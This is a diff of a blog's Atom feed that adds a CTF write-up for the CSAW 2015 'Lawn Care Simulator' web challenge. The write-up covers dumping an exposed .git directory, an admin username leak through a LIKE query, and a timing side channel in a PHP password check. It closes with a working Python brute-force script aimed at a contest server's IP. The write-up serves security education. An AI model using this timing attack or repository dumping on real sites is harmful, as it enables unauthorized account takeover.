@@ -4,7 +4,7 @@
   <title><![CDATA[The Swappage Playground]]></title>
   <link href="http://swappage.github.io/atom.xml" rel="self"/>
   <link href="http://swappage.github.io/"/>
-  <updated>2015-09-21T23:32:30+02:00</updated>
+  <updated>2015-09-23T10:59:11+02:00</updated>
   <id>http://swappage.github.io/</id>
   <author>
     <name><![CDATA[Swappage]]></name>
@@ -12,6 +12,258 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW CTF 2015: Lawn Care Simulator]]></title>
+    <link href="http://swappage.github.io/blog/2015/09/23/csaw-ctf-2015-lawn-care-simulator/"/>
+    <updated>2015-09-23T10:39:56+02:00</updated>
+    <id>http://swappage.github.io/blog/2015/09/23/csaw-ctf-2015-lawn-care-simulator</id>
+    <content type="html"><![CDATA[<p>It’s CTF season! and CSAW CTF, one of the funniest CTFs that takes place every year in september has ended this weekend, here is a writeup for one of the web challenges that were provided during the contest.</p>
+
+<p>This 200 points challenge was a web application running a nicely useless javascript for “growing lawn”, and was providing all the typical features available in a standard web application, including registration and login.</p>
+
+<p>The objective of this challenge was to login as admin.</p>
+
+<!--more-->
+
+<h2 id="clone-all-the-things">Clone all the things</h2>
+
+<p>By looking at the index source code we could notice that the version number, present in the bottom corner of the page, was calculated based on the git repository hash.</p>
+
+<p><img class="center" src="http://swappage.github.io/images/2015-09-23_lawn-care-simulator/version.png" /></p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span class="line">    <span class="kd">function</span> <span class="nx">init</span><span class="p">(){</span>
+</span><span class="line">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;login_form&#39;</span><span class="p">).</span><span class="nx">onsubmit</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span><span class="line">            <span class="kd">var</span> <span class="nx">pass_field</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">);</span>
+</span><span class="line">            <span class="nx">pass_field</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">pass_field</span><span class="p">.</span><span class="nx">value</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Hex</span><span class="p">);</span>
+</span><span class="line">    <span class="p">};</span>
+</span><span class="line">    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="s1">&#39;.git/refs/heads/master&#39;</span><span class="p">).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">version</span><span class="p">){</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#version&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;Version: &#39;</span> <span class="o">+</span>  <span class="nx">version</span><span class="p">.</span><span class="nx">substring</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">))});</span>
+</span><span class="line">    <span class="nx">initGrass</span><span class="p">();</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>Since the .git directory is available in the webroot, we can crawl it and download the entire repository, to obtain the source code and spot bugs.
+To make my life easier i used DVCS-Pillage: https://github.com/evilpacket/DVCS-Pillage
+to automate the whole process, and at the end i had all the website sources available to me, except.. of course for the flag.</p>
+
+<pre><code>-rw-r--r--  1 root root  109 Sep 19 00:46 ___HINT___
+-rw-r--r--  1 root root 2406 Sep 19 00:46 index.html
+-rw-r--r--  1 root root 1410 Sep 19 00:46 jobs.html
+drwxr-xr-x  2 root root 4096 Sep 19 14:50 js
+-rw-r--r--  1 root root  918 Sep 19 00:46 premium.php
+-rw-r--r--  1 root root 2937 Sep 19 00:46 sign_up.php
+-rw-r--r--  1 root root   78 Sep 19 01:51 test.php
+-rw-r--r--  1 root root  780 Sep 19 00:46 validate_pass.php
+</code></pre>
+
+<h2 id="the-bugs">The bugs</h2>
+<p>In the php code there were two bugs:</p>
+
+<p>The first was in the registration page <em>sign_up.php</em></p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class="line"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span><span class="p">){</span>
+</span><span class="line">    <span class="k">require_once</span> <span class="s1">&#39;db.php&#39;</span><span class="p">;</span>
+</span><span class="line">    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$DB_HOST</span><span class="p">,</span> <span class="nv">$SQL_USER</span><span class="p">,</span> <span class="nv">$SQL_PASSWORD</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Could not connect: &#39;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">());</span>
+</span><span class="line">    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Mysql error&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="nv">$user</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
+</span><span class="line">    <span class="c1">// check to see if the username is available</span>
+</span><span class="line">    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT username FROM users WHERE username LIKE &#39;</span><span class="si">$user</span><span class="s2">&#39;;&quot;</span><span class="p">;</span>
+</span><span class="line">    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Query failed: &#39;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">());</span>
+</span><span class="line">    <span class="nv">$line</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">);</span>
+</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nv">$line</span> <span class="o">==</span> <span class="k">NULL</span><span class="p">){</span>
+</span><span class="line">        <span class="c1">// Signing up for premium is still in development</span>
+</span><span class="line">        <span class="k">echo</span> <span class="s1">&#39;&lt;h2 style=&quot;margin: 60px;&quot;&gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&lt;/h2&gt;&#39;</span><span class="p">;</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line">    <span class="k">else</span> <span class="p">{</span>
+</span><span class="line">        <span class="k">echo</span> <span class="s1">&#39;&lt;h2 style=&quot;margin: 60px;&quot;&gt;Username: &#39;</span> <span class="o">.</span> <span class="nv">$line</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; is not available&lt;/h2&gt;&quot;</span><span class="p">;</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line"><span class="k">else</span> <span class="p">{</span>
+</span><span class="line"><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+<p>As it’s possible to notice the query used to verify if a user already existed, used a <em>LIKE</em> statement, this means that by submitting a username value with the character %, we could disclose the already registered users; of course, since the registration was still closed, the only user we were expecting to find as already registered was the admin username, which happened to be ~~FLAG~~.</p>
+
+<p><img class="center" src="http://swappage.github.io/images/2015-09-23_lawn-care-simulator/user_exists.png" /></p>
+
+<p>The second one was in the way the login process was handled by the validate_pass.php</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="o">&lt;?</span>
+</span><span class="line"><span class="k">function</span> <span class="nf">validate</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">    <span class="k">require_once</span> <span class="s1">&#39;db.php&#39;</span><span class="p">;</span>
+</span><span class="line">    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$DB_HOST</span><span class="p">,</span> <span class="nv">$SQL_USER</span><span class="p">,</span> <span class="nv">$SQL_PASSWORD</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Could not connect: &#39;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">());</span>
+</span><span class="line">    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Mysql error&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="nv">$user</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
+</span><span class="line">    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT hash FROM users WHERE username=&#39;</span><span class="si">$user</span><span class="s2">&#39;;&quot;</span><span class="p">;</span>
+</span><span class="line">    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Query failed: &#39;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">());</span>
+</span><span class="line">    <span class="nv">$line</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">);</span>
+</span><span class="line">    <span class="nv">$hash</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">];</span>
+</span><span class="line">
+</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$pass</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$hash</span><span class="p">))</span>
+</span><span class="line">        <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line">    <span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class="line">    <span class="k">while</span><span class="p">(</span><span class="nv">$hash</span><span class="p">[</span><span class="nv">$index</span><span class="p">]){</span>
+</span><span class="line">        <span class="k">if</span> <span class="p">(</span><span class="nv">$pass</span><span class="p">[</span><span class="nv">$index</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$hash</span><span class="p">[</span><span class="nv">$index</span><span class="p">])</span>
+</span><span class="line">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span><span class="line">        <span class="c1"># Protect against brute force attacks</span>
+</span><span class="line">        <span class="nb">usleep</span><span class="p">(</span><span class="mi">300000</span><span class="p">);</span>
+</span><span class="line">        <span class="nv">$index</span><span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line"><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>What the script implements as a <em>protection against brute force attacks</em> is faulty, and leave the script open to a byte by byte bruteforce attack on the hash, which wasn’t calculated by the server, but directly by the javascript on the client side.</p>
+
+<p>By analyzing the timings of the server response it was possible to guess the characters that were composing the md5 hash for the ~~FLAG~~ user.</p>
+
+<p>I built this horrible python script to do the job and retrieve the flag.</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+<span class="line-number">37</span>
+<span class="line-number">38</span>
+<span class="line-number">39</span>
+<span class="line-number">40</span>
+<span class="line-number">41</span>
+</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/python</span>
+</span><span class="line">
+</span><span class="line"><span class="kn">import</span> <span class="nn">datetime</span>
+</span><span class="line"><span class="kn">import</span> <span class="nn">time</span>
+</span><span class="line"><span class="kn">import</span> <span class="nn">requests</span>
+</span><span class="line"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">combinations</span>
+</span><span class="line"><span class="kn">import</span> <span class="nn">itertools</span>
+</span><span class="line">
+</span><span class="line"><span class="n">letters</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;a&#39;</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">,</span> <span class="s">&#39;e&#39;</span><span class="p">,</span> <span class="s">&#39;f&#39;</span><span class="p">,</span> <span class="s">&#39;0&#39;</span><span class="p">,</span> <span class="s">&#39;1&#39;</span><span class="p">,</span> <span class="s">&#39;2&#39;</span><span class="p">,</span> <span class="s">&#39;3&#39;</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">,</span> <span class="s">&#39;5&#39;</span><span class="p">,</span> <span class="s">&#39;6&#39;</span><span class="p">,</span> <span class="s">&#39;7&#39;</span><span class="p">,</span> <span class="s">&#39;8&#39;</span><span class="p">,</span> <span class="s">&#39;9&#39;</span><span class="p">]</span>
+</span><span class="line">
+</span><span class="line"><span class="nb">hash</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class="line"><span class="n">padding</span> <span class="o">=</span> <span class="s">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span>
+</span><span class="line"><span class="n">delay</span> <span class="o">=</span> <span class="mi">300</span>
+</span><span class="line">
+</span><span class="line"><span class="n">current_milli_time</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">))</span>
+</span><span class="line">
+</span><span class="line"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class="line">	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">combinations_with_replacement</span><span class="p">(</span><span class="n">letters</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
+</span><span class="line"><span class="c">#		time.sleep(0.5)</span>
+</span><span class="line">		<span class="n">start</span> <span class="o">=</span> <span class="n">current_milli_time</span><span class="p">()</span>
+</span><span class="line">
+</span><span class="line">		<span class="n">stringa</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
+</span><span class="line">		<span class="k">print</span> <span class="s">&quot;[*] bruteforcing MD5 with: &quot;</span> <span class="o">+</span> <span class="nb">hash</span> <span class="o">+</span> <span class="n">stringa</span> <span class="o">+</span> <span class="n">padding</span>
+</span><span class="line">		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&quot;http://54.175.3.248:8089/premium.php&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;~~FLAG~~&#39;</span><span class="p">,</span> <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="nb">hash</span> <span class="o">+</span> <span class="n">stringa</span> <span class="o">+</span> <span class="n">padding</span><span class="p">})</span>
+</span><span class="line">		<span class="c">#print(r.status_code, r.reason)</span>
+</span><span class="line">
+</span><span class="line">		<span class="n">stop</span> <span class="o">=</span> <span class="n">current_milli_time</span><span class="p">()</span>
+</span><span class="line">		<span class="n">elapsed</span> <span class="o">=</span> <span class="n">stop</span> <span class="o">-</span> <span class="n">start</span>
+</span><span class="line">		<span class="k">print</span> <span class="n">elapsed</span>
+</span><span class="line">		<span class="k">if</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="n">delay</span><span class="p">:</span>
+</span><span class="line">			<span class="n">start</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
+</span><span class="line">			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&quot;http://54.175.3.248:8089/premium.php&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;~~FLAG~~&#39;</span><span class="p">,</span> <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="nb">hash</span> <span class="o">+</span> <span class="n">stringa</span> <span class="o">+</span> <span class="n">padding</span><span class="p">})</span>
+</span><span class="line">			<span class="n">stop</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
+</span><span class="line">			<span class="k">if</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="n">delay</span><span class="p">:</span>
+</span><span class="line">				<span class="k">print</span> <span class="s">&quot;[*] character found: &quot;</span> <span class="o">+</span> <span class="n">stringa</span>
+</span><span class="line">				<span class="nb">hash</span> <span class="o">+=</span> <span class="n">stringa</span>
+</span><span class="line">				<span class="n">padding</span> <span class="o">=</span> <span class="n">padding</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span><span class="line">				<span class="n">delay</span> <span class="o">=</span> <span class="n">delay</span> <span class="o">+</span> <span class="mi">300</span>
+</span><span class="line">				<span class="k">print</span> <span class="n">padding</span>
+</span><span class="line">				<span class="k">print</span> <span class="nb">hash</span>
+</span><span class="line">				<span class="k">break</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[EKOPARTY PRE-CTF 2015: Web200]]></title>
